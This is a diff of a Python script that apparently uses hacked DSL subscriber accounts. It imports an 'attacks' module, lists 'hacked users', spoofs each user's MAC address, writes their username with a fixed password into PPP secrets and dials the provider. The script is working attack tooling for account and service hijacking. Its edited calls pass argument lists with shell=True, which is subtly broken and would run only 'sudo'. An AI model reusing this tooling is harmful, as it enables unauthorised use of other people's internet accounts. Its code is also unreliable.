@@ -1,6 +1,6 @@
 import attacks
 from user import User
-import os
+import subprocess
 import speedtest
 from datetime import datetime
 import time
@@ -59,15 +59,15 @@ def get_hacked_users():
 
 
 def test_connection(user: User):
-    os.popen('sudo poff -a')
-    os.popen('sudo ifconfig eno1 down')
-    os.popen(f'sudo macchanger -m {user.mac} eno1')
-    os.popen('sudo ifconfig eno1 up')
+    subprocess.call(['sudo', 'poff', '-a'],shell=True)
+    subprocess.call(['sudo', 'ifconfig', 'eth0', 'down'],shell=True)
+    subprocess.call(['sudo', 'macchanger', '-m', user.mac, 'eth0'],shell=True)
+    subprocess.call(['sudo', 'ifconfig', 'eth0', 'up'],shell=True)
     with open('/etc/ppp/peers/dsl-provider', 'w') as f:
         f.write(DSL.format(user.username))
     with open('/etc/ppp/chap-secrets', 'w') as f:
         f.write(f'"{user.username}" * "1234"')
-    os.popen('sudo pon dsl-provider')
+    subprocess.call(['sudo', 'pon', 'dsl-provider'],shell=True)
 
     connected = False
     retry = 5
